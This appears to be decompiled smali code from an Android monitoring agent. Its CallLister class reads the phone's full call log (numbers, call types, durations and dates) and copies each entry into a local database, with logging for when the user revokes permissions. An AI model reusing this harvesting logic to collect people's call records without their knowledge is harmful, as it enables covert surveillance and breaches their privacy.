.class public Lcom/hp/vd/module/monitor/call/CallLister;
.super Ljava/lang/Object;
.source "CallLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "CallLister"


# instance fields
.field protected callBroadcastReceiver:Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;

.field protected context:Lcom/hp/vd/context/Context;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/CallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/CallData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 27
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->context:Lcom/hp/vd/context/Context;

    .line 28
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->callBroadcastReceiver:Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 40
    iput-object p1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 41
    iput-object p2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->context:Lcom/hp/vd/context/Context;

    .line 42
    iput-object p3, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 43
    iput-object p4, p0, Lcom/hp/vd/module/monitor/call/CallLister;->callBroadcastReceiver:Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;

    .line 44
    iput-object p5, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .line 50
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "CallLister"

    const-string v2, "run() called."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 52
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->callBroadcastReceiver:Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->deactivate()V

    .line 58
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v7, 0x3

    const/4 v8, 0x0

    const/4 v9, 0x2

    .line 62
    :try_start_0
    sget-object v2, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const-string v6, "_id"

    move-object v1, v0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 114
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    const-string v3, "NullPointerException caught"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 109
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    const-string v3, "Probably permissions were modified by the user (without projection)"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_2
    move-exception v1

    .line 71
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "CallLister"

    const-string v4, "SQLiteException caught while quering call cursor. Now trying without projection."

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v1, 0x5

    .line 73
    new-array v3, v1, [Ljava/lang/String;

    const-string v1, "_id"

    aput-object v1, v3, v8

    const-string v1, "type"

    const/4 v2, 0x1

    aput-object v1, v3, v2

    const-string v1, "number"

    aput-object v1, v3, v9

    const-string v1, "duration"

    aput-object v1, v3, v7

    const/4 v1, 0x4

    const-string v2, "date"

    aput-object v2, v3, v1

    .line 84
    :try_start_1
    sget-object v2, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v4, 0x0

    const/4 v5, 0x0

    const-string v6, "_id"

    move-object v1, v0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_7
    .catch Ljava/lang/SecurityException; {:try_start_1 .. :try_end_1} :catch_6
    .catch Ljava/lang/NullPointerException; {:try_start_1 .. :try_end_1} :catch_5

    :goto_0
    if-nez v1, :cond_0

    .line 120
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "CallLister"

    const-string v2, "Could not open callLog cursor (with or without projection)."

    invoke-interface {v0, v1, v2, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 125
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "run(): calls have been found = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v2, v3, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    const/4 v0, -0x1

    .line 131
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    .line 135
    :goto_1
    :try_start_2
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_1

    add-int/lit8 v8, v8, 0x1

    .line 138
    new-instance v2, Lcom/hp/vd/data/CallData;

    invoke-direct {v2}, Lcom/hp/vd/data/CallData;-><init>()V

    const-string v3, "_id"

    .line 140
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/CallData;->internalId:Ljava/lang/Integer;

    const-string v3, "type"

    .line 142
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/CallData;->type:Ljava/lang/Integer;

    const-string v3, "number"

    .line 143
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/CallData;->number:Ljava/lang/String;

    const-string v3, "duration"

    .line 144
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, v2, Lcom/hp/vd/data/CallData;->duration:Ljava/lang/Integer;

    .line 146
    new-instance v3, Ljava/util/Date;

    const-string v4, "date"

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    invoke-direct {v3, v4, v5}, Ljava/util/Date;-><init>(J)V

    iput-object v3, v2, Lcom/hp/vd/data/CallData;->createdAt:Ljava/util/Date;

    .line 148
    iget-object v3, p0, Lcom/hp/vd/module/monitor/call/CallLister;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v3, v2}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 150
    iget-object v2, v2, Lcom/hp/vd/data/CallData;->internalId:Ljava/lang/Integer;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    move-object v0, v2

    goto :goto_1

    .line 159
    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    .line 160
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "run(): calls listed = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 166
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_call_id"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    .line 169
    :try_start_3
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "max_call_id"

    invoke-virtual {v2, v3, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 170
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "gather_calls_on_start"

    const-string v4, "false"

    invoke-virtual {v2, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 172
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    .line 173
    iget-object v3, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v2, v3}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 175
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "CallLister"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "run(): commited max_call_id= "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 180
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->callBroadcastReceiver:Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->activate()V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_2

    :catch_3
    move-exception v0

    .line 183
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "gather_calls_on_start"

    const-string v4, "true"

    invoke-virtual {v2, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 185
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "CallLister"

    const-string v4, "run(): could not commit max_call_id and mark callLister as already started."

    invoke-interface {v2, v3, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 192
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_call_id"

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 194
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "onCallStateChanged(): reverted max_call_id to the old value = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v2, v1, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :goto_2
    return-void

    :catch_4
    move-exception v1

    .line 154
    iget-object v2, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "CallLister"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Exception caught while read/write: maxId: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v3, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_5
    move-exception v0

    .line 103
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    const-string v3, "NullPointerException caught"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_6
    move-exception v0

    .line 98
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    const-string v3, "Probably permissions were modified by the user (with projection)"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_7
    move-exception v0

    .line 93
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallLister"

    const-string v3, "SQLiteException caught while quering call cursor with projection. Nothing more to try. Exiting..."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
